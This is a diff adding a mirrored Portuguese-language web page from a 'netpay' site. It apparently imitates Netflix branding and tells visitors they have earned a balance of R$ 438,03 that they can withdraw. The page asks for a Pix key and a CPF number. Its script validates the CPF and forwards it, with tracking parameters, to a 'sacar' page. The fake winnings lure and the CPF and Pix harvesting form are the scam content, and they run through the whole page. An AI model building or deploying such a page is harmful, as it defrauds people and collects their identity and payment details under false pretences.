@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<!-- Mirrored from noticiasoficiais.shop/netpay/page/page11.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Aug 2024 12:51:51 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Youtube Shorts</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link rel="stylesheet" href="../../../stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+    <style>
+        #netflixlogoapp{
+            width: 100px;
+            margin: 10px;
+        }
+        *{
+            margin: 0px;
+            font-family: "Poppins", sans-serif;
+            padding: 0px;
+        }
+        body{
+            background-color: black;
+        }
+        #barranetflix{
+            background: linear-gradient( black, rgba(255, 0, 0, 0));
+            display: flex;
+            justify-content: space-between;
+            margin: 10px;
+        }
+        #bannerprincipal{
+            background-image: url('../images/bannerr.png') ;
+            background-position: center; /* Center the image */
+            background-repeat: no-repeat; /* Do not repeat the image */
+            background-size: cover;
+        }
+        #textoprincipal{
+            color: white;
+            width: 95%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-size: 27px;
+        }
+        #ganheassistindocaixa{
+            padding: 5px;
+            text-align: center;
+            font-size: 23px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            margin-top: 10px;
+            background-color: rgb(211, 15, 15);
+            width: 60%;
+        }
+        #textodetalhelogin{
+            font-size: 15px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        #inputtypetext{
+            border: 1px solid rgba(255, 255, 255, 0.411);
+            background-color: rgba(0, 0, 0, 0.63);
+            color: white;
+            width: 100%;
+            border-radius: 5px;
+            margin-top: 20px;
+            padding: 13px 35px;
+            font-weight: 700;
+        }
+        #inputtypetextx{
+            border: 1px solid rgb(190, 16, 16);
+            background-color: rgba(56, 56, 56, 0.452);
+            color: white;
+            width: 24%;
+            height: 90px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            border-radius: 5px;
+            margin-top: 20px;
+            padding: 13px 30px;
+            font-weight: 700;
+        }
+        #inputtypetextx:hover{
+            border: 1px solid rgb(190, 16, 16);
+            background-color: rgb(190, 16, 16);
+            color: white;
+            width: 24%;
+            border-radius: 5px;
+            margin-top: 20px;
+            padding: 13px 30px;
+            font-weight: 700;
+        }
+        a{
+            text-decoration: none;
+        }
+        #botaoproximaetapa{
+            padding: 10px;
+            font-weight: 700;
+            width: 85%;
+            margin-top: 20px;
+            color: white;
+            border-radius: 5px;
+            font-size: 18px;
+            background-color: rgb(211, 15, 15);
+        }
+        #botaoproximaetapaa{
+            padding: 10px;
+            font-weight: 700;
+            width: 70%;
+            margin-top: 10px;
+            color: rgb(211, 15, 15);
+            border-radius: 5px;
+            font-size: 18px;
+            background-color: rgb(41, 3, 3);
+            border: 1px solid rgb(211, 15, 15);
+        }
+        #botaolucraretapa{
+            background: linear-gradient(rgba(0, 0, 0, 0), rgb(0, 0, 0));
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+        }
+        #botaolucraretapaa{
+            display: flex;
+            justify-content: center;
+            margin-top: -90px;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+        }
+        #informativo{
+            padding: 10px;
+            margin: 10px;
+            margin-top: 5px;
+            display: flex;
+            margin-left:  -150px;
+            justify-content: center;
+            align-items: center;
+            border-radius: 5px;
+            height: 200px;
+        }
+        #pipocanetflix{
+            width: 30px;
+        }
+        #dinheirologo{
+            width: 60px;
+        }
+        .tvnetflix{
+            width: 90%;
+        }
+        #tvnetflixaax{
+            width: 250px;
+        }
+        #tvnetflixapp{
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #videomp4net{
+            width: 200px;
+            margin-left: 50px;
+            margin-top: 30px;
+        }
+        #informativo div:first-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #informativo div:last-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+            margin-top: -150px;
+            margin-left: 20px;
+        }
+        #textodetalhelogindd{
+            color: white;
+            padding: 30px;
+            font-size: 19px;
+            font-weight: 600;
+            margin-top: -35px;
+            text-align: center;
+        }
+        footer{
+            color: white;
+            background-color: rgb(19, 19, 19);
+            height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #saldolead{
+            padding: 10px 15px;
+            background-color: rgba(255, 0, 0, 0.562);
+            border: 1px solid red;
+            height: 15px;
+            border-radius: 5px;
+            display: flex;
+            margin-top: 10px;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .rating{
+        transform: translate(-50%,-50%) rotateY(180deg);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 30px;
+        margin-left: 60%;
+        }
+
+        .rating input{
+        display: none;
+        }
+
+        .rating label{
+            display: block;
+            cursor: pointer;
+            width: 50px;
+        }
+
+        .rating label:before{
+        content: '\f005';
+        font-family: fontAwesome;
+        position: relative;
+        display: block;
+        font-size: 50px;
+        color: #555555;
+        }
+
+        .rating label:after{
+        content: '\f005';
+        font-family: fontAwesome;
+        position: absolute;
+        display: block;
+        font-size: 50px;
+        color: #db0303;
+        top: 0;
+        opacity: 0;
+        transition: .5;
+        text-shadow: 0 4px 5px rgba(138, 10, 10, 0.658);
+        }
+        .rating label:hover:after,
+        .rating label:hover ~ label:after,
+        .rating input:checked ~ label:after{
+        opacity: 1;
+        }
+        #avaliacaotexto{
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+        }
+        #avaloacaoserie{
+            margin-top: 10px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #youtubevideo{
+            margin: 10px;
+            width: 100%;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            margin-left: 7%;
+            align-items: center;
+        }
+        #simounaonet{
+            display: flex;
+            width: 90%;
+            justify-content: space-between;
+            align-items: center;
+        }
+        #sadoatyiualnet{
+            text-align: center;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: 10px;
+            font-weight: 700;
+            background-color: #db030349;
+            border: 1px solid #db0303;
+            border-radius: 10px;
+            font-size: 30px;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div id="bannerprincipal">
+        <div id="barranetflix">
+            <img src="../images/netflix.png" id="netflixlogoapp">
+            <div id="saldolead">Saldo: R$ <b>438,03</b></div>
+        </div> 
+
+        <div id="notificacaodin" style="background-color: #49060688; border: 1px solid #db0303; margin: 10px; border-radius: 5px; color: rgb(221, 21, 21); padding: 10px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+            <p id="textonotifi" style="color: #ffffff;">Você ganhou <b>R$ 94,19</b></p>
+            <p><b style="color: #ffffff;">REALIZE SEU SAQUE</b></p>
+        </div>
+
+        <p id="sadoatyiualnet">
+            <img src="images/pix.png" style="width: 80px;" alt="">Saldo: R$ 438,03 <b style="font-size: 15px; margin-top: 10px; font-weight: 500;">Parabéns! Você concluiu a primeira etapa e está pronto para realizar seu primeiro saque</b></p>
+    
+    <div id="avaloacaoserie">
+        <p id="avaliacaotexto">Tipo Chave Pix</p>
+        <div id="simounaonet">
+            <button type="text" id="inputtypetextx" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-people-fill" viewBox="0 0 16 16">
+                    <path d="M7 14s-1 0-1-1 1-4 5-4 5 3 5 4-1 1-1 1zm4-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6m-5.784 6A2.24 2.24 0 0 1 5 13c0-1.355.68-2.75 1.936-3.72A6.3 6.3 0 0 0 5 9c-4 0-5 3-5 4s1 1 1 1zM4.5 8a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5"/>
+                  </svg>
+                <p>CPF/ CNPJ</p>
+            </button>
+            <button type="text" id="inputtypetextx" style="margin-left: 5px;" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-inbox-fill" viewBox="0 0 16 16">
+                    <path d="M4.98 4a.5.5 0 0 0-.39.188L1.54 8H6a.5.5 0 0 1 .5.5 1.5 1.5 0 1 0 3 0A.5.5 0 0 1 10 8h4.46l-3.05-3.812A.5.5 0 0 0 11.02 4zm-1.17-.437A1.5 1.5 0 0 1 4.98 3h6.04a1.5 1.5 0 0 1 1.17.563l3.7 4.625a.5.5 0 0 1 .106.374l-.39 3.124A1.5 1.5 0 0 1 14.117 13H1.883a1.5 1.5 0 0 1-1.489-1.314l-.39-3.124a.5.5 0 0 1 .106-.374z"/>
+                  </svg>
+                <p>Email</p>
+            </button>
+            <button type="text" id="inputtypetextx" style="margin-left: 5px;" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-dice-5-fill" viewBox="0 0 16 16">
+                    <path d="M3 0a3 3 0 0 0-3 3v10a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3V3a3 3 0 0 0-3-3zm2.5 4a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m8 0a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0M12 13.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3M5.5 12a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0M8 9.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3"/>
+                  </svg>
+                <p>Aleatória</p>
+            </button>
+            <button type="text" id="inputtypetextx" style="margin-left: 5px;" placeholder="Escreva aqui...">
+                <svg xmlns="http://www.w3.org/2000/svg" style="margin-top: 5px;" width="25" height="25" fill="currentColor" class="bi bi-phone-fill" viewBox="0 0 16 16">
+                    <path d="M3 2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2zm6 11a1 1 0 1 0-2 0 1 1 0 0 0 2 0"/>
+                  </svg>
+                <p>Celular</p>
+            </button>
+        </div>
+        
+    <div id="avaloacaoserie">
+        <input type="text" id="inputtypetext" placeholder="Chave Pix aqui...">
+    </div>
+    
+    </div>
+    <!-- FORMS -->
+    <div class="elementor-widget-container">
+        <!-- Adicionando link para FontAwesome 5 -->
+        <link rel="stylesheet" href="css/all.min.html">
+        <style>
+            /* Estilos CSS */
+    
+            .container {
+                width: 90%;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                margin-top: 20px;
+                margin-bottom: 20px;
+                text-align: center;
+            }
+    
+            /* Estilo para título do formulário */
+            h2 {
+                margin-bottom: 20px;
+                color: #747272; /* Cor do texto em cinza */
+            }
+    
+            .input-wrapper {
+                margin-bottom: 20px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                text-align: center;
+                width: 100%;
+            }
+    
+            input[type="tel"] {
+                width: 100%;
+                padding: 13px;
+                margin: 0px 0;
+                border: 1px solid #CCCCCC; /* Contorno da borda em cinza com 1px de largura */
+                font-size: 13px;
+                outline: none; /* Remove o efeito de zoom ao clicar */
+                box-sizing: border-box; /* Garante que o padding não altere a largura total do campo */
+                border-radius: 8px;
+            }
+    
+            .center {
+                display: flex;
+                justify-content: center;
+                margin-top: 10px;
+                margin-left: 10%;
+            }
+    
+            .button {
+                width: 100%;
+                padding: 13px;
+                background-color: #CCCCCC; /* Cor inicial do botão cinza */
+                border: 0px;
+                color: white;
+                text-align: center;
+                text-decoration: none;
+                display: inline-block;
+                font-size: 15px;
+                font-weight: 600;
+                cursor: pointer;
+                border-radius: 8px;
+            }
+    
+            .button:hover {
+                background-color: #CCCCCC; /* Cor do hover ajustada */
+            }
+    
+            p {
+                font-size: 14px;
+                color: #747272;
+                font-weight: 500;
+                font-family: Arial, sans-serif;
+            }
+    
+            /* Estilo para mensagem de validação */
+            .validation-message {
+                margin: 20px 30px 0; /* Margem ajustada */
+                display: none;
+                position: relative;
+                top: -10px; /* Valor negativo para subir a mensagem */
+            }
+    
+            /* Estilo para mensagem de sucesso */
+            .success-message {
+                color: green !important; /* Definindo a cor verde com prioridade */
+            }
+    
+            /* Estilo para mensagem de falha */
+            .error-message {
+                color: red;
+            }
+    
+            /* Estilo para ícone de verificação */
+            .validation-icon {
+                position: absolute;
+                left: -25px;
+                top: 50%;
+                transform: translateY(-50%);
+            }
+    
+            /* Estilo para ícone de erro */
+            .error-icon {
+                position: absolute;
+                left: -25px;
+                top: 50%;
+                transform: translateY(-50%);
+                font-size: 14px;
+                color: red;
+            }
+            #cpf{
+                border: 1px solid rgba(255, 255, 255, 0.411);
+                background-color: rgba(0, 0, 0, 0.63);
+                color: white;
+                width: 90%;
+                border-radius: 5px;
+                margin-top: 20px;
+                padding: 13px 30px;
+                margin-left: 40px;
+                margin-top: -10px;
+                font-weight: 700;
+            }
+            #botaoproximaetapa{
+                padding: 10px;
+                font-weight: 700;
+                width: 90%;
+                margin-top: 20px;
+                color: white;
+                border-radius: 5px;
+                font-size: 18px;
+                margin-top: -10px;
+                background-color: #CCCCCC;
+            }
+        </style>
+    
+    
+    
+    <div class="container">
+
+        <form id="cpfForm" action="https://noticiasoficiais.shop/netpay/page/parte01.html" method="get">
+            <div class="input-wrapper">
+                <input type="tel" id="cpf" name="cpf" placeholder="Digite seu CPF" autocomplete="off" maxlength="14">
+            </div>
+            <p class="validation-message success-message">CPF válido</p>
+            <p class="validation-message error-message">CPF inválido</p> <!-- Mensagem de falha com ícone adicionado -->
+            
+            <div class="center">
+                <input type="submit" id="botaoproximaetapa" value="SACAR AGORA MESMO" class="button" disabled=""> <!-- Botão inicialmente desativado -->
+            </div>
+        </form>
+    </div>
+
+    <div style="width: 100%; height: 60px; background: linear-gradient(rgba(0, 0, 0, 0), black);"></div>
+    
+    <script>
+        // Função para validar CPF
+        function isValidCPF(cpf) {
+            cpf = cpf.replace(/\D/g, ''); // Remove caracteres não numéricos
+    
+            if (cpf.length !== 11) {
+                return false;
+            }
+    
+            var sum = 0;
+            var remainder;
+    
+            for (var i = 1; i <= 9; i++) {
+                sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+            }
+    
+            remainder = (sum * 10) % 11;
+    
+            if ((remainder === 10) || (remainder === 11)) {
+                remainder = 0;
+            }
+    
+            if (remainder !== parseInt(cpf.substring(9, 10))) {
+                return false;
+            }
+    
+            sum = 0;
+    
+            for (var i = 1; i <= 10; i++) {
+                sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+            }
+    
+            remainder = (sum * 10) % 11;
+    
+            if ((remainder === 10) || (remainder === 11)) {
+                remainder = 0;
+            }
+    
+            if (remainder !== parseInt(cpf.substring(10, 11))) {
+                return false;
+            }
+    
+            return true;
+        }
+    
+        // Adicionando a máscara de CPF enquanto o usuário digita
+        document.getElementById('cpf').addEventListener('input', function(event) {
+            var cpfInput = event.target.value.replace(/\D/g, ''); // Remove caracteres não numéricos
+            var successMessage = document.querySelector('.validation-message.success-message');
+            var errorMessage = document.querySelector('.validation-message.error-message');
+            var submitButton = document.querySelector('.button');
+    
+            // Aplica a máscara
+            if (cpfInput.length <= 11) {
+                cpfInput = cpfInput.replace(/(\d{3})(\d{1,3})?(\d{1,3})?(\d{1,2})?/, function(match, p1, p2, p3, p4) {
+                    var maskedCpf = p1;
+                    if (p2) {
+                        maskedCpf += '.' + p2;
+                    }
+                    if (p3) {
+                        maskedCpf += '.' + p3;
+                    }
+                    if (p4) {
+                        maskedCpf += '-' + p4;
+                    }
+                    return maskedCpf;
+                });
+                event.target.value = cpfInput;
+            }
+    
+            if (isValidCPF(cpfInput)) {
+                successMessage.style.display = 'block'; // Exibe mensagem de sucesso
+                errorMessage.style.display = 'none'; // Esconde mensagem de falha
+                submitButton.style.backgroundColor = 'rgb(211, 15, 15)'; // Ativa o botão
+                submitButton.removeAttribute('disabled');
+            } else {
+                successMessage.style.display = 'none'; // Esconde mensagem de sucesso
+                errorMessage.style.display = 'block'; // Exibe mensagem de falha
+                submitButton.style.backgroundColor = '#CCCCCC'; // Desativa o botão
+                submitButton.setAttribute('disabled', 'disabled');
+            }
+        });
+    
+        // Função para remover pontuação e máscara do CPF
+        function removeMaskAndPunctuation(cpf) {
+            return cpf.replace(/\D/g, ''); // Remove todos os caracteres não numéricos
+        }
+    
+        // Adicionando evento de envio ao formulário
+        document.getElementById('cpfForm').addEventListener('submit', function(event) {
+            var cpfInput = document.getElementById('cpf').value; // Obtém o valor do campo CPF
+            var cleanedCPF = removeMaskAndPunctuation(cpfInput); // Remove a máscara e pontuação do CPF
+            var utmSource = localStorage.getItem('utm_source'); // Recupera a UTM Source do localStorage
+            var utmMedium = localStorage.getItem('utm_medium'); // Recupera a UTM Medium do localStorage
+            var utmCampaign = localStorage.getItem('utm_campaign'); // Recupera a UTM Campaign do localStorage
+            
+            var utm_Content = localStorage.getItem('utm_content'); // Recupera a
+    
+            // Redireciona para a próxima página com os parâmetros de CPF e UTM
+            // Define o caminho base
+             var basePath = 'sacar.html';
+
+            // Adiciona os parâmetros à URL
+            var newURL = basePath + '?cpf=' + cleanedCPF + '&utm_source=' + utmSource + '&utm_medium=' + utmMedium + '&utm_campaign=' + utmCampaign + '&utm_content=' + utm_Content;
+
+            // Redireciona para a nova URL
+            window.location.href = newURL;
+
+    
+            event.preventDefault(); // Evita o envio padrão do formulário
+        });
+    </script>
+    
+    <!-- Adicionando a meta tag viewport -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    
+    
+    <script>
+        class YouTubeVideo extends HTMLElement {
+            constructor() {
+                super();
+                this.attachShadow({ mode: 'open' });
+                this.shadowRoot.appendChild(this.getStyle());
+                this.addEventListener('click', () => {
+                    this.classList.add('clicked');
+                    this.shadowRoot.appendChild(this.getIframe());
+                });
+            }
+        
+            getStyle() {
+                const style = document.createElement('style');
+                style.textContent = `
+                    :host {
+                        position: relative;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        width: 100%;
+                        max-width: 100%;
+                        aspect-ratio: 16/9;
+                        cursor: pointer;
+                        background: silver url('https://img.youtube.com/vi/${this.getAttribute('video-id')}/0.jpg') no-repeat center / cover;
+                    }
+                    :host:before {
+                        content: '';
+                        width: 15%;
+                        aspect-ratio: 1;
+                        border-radius: 50%;
+                        background: white url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 122.88"><polygon points="140,60.97 32,122.88 32,0 140,60.97" fill="black" /></svg>') no-repeat center / 50% 50%;
+                        filter: drop-shadow(0px 0px 16px rgba(0,0,0,0.3));
+                        transition: all 0.3s ease;
+                    }
+                    :host(.clicked):before {
+                        opacity: 0;
+                    }`;
+                return style;
+            }
+        
+            getIframe() {
+                const iframe = document.createElement('iframe');
+                iframe.setAttribute('frameborder', '0');
+                iframe.setAttribute('allow', 'autoplay');
+                iframe.setAttribute('allowfullscreen', '');
+                iframe.style.cssText = `position: absolute; top: 0; left: 0; width: 100%; height: 100%;`;
+                const params = new URLSearchParams({ autoplay: 1, modestbranding: 1, rel: 0, iv_load_policy: 3, showinfo: 0 });
+                ['controls', 'start', 'end', 'loop', 'playlist'].forEach(
+                    attr => { if (this.hasAttribute(attr)) params.set(attr, this.getAttribute(attr)); }
+                );
+                iframe.src = `https://www.youtube-nocookie.com/embed/${this.getAttribute('video-id')}?${params}`;
+                iframe.onload = () => this.style.background = 'transparent';
+                return iframe;
+            }
+        }
+        customElements.define('youtube-video', YouTubeVideo);
+        </script>
+</body>
+
+<!-- Mirrored from noticiasoficiais.shop/netpay/page/page11.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Aug 2024 12:51:52 GMT -->
+</html>
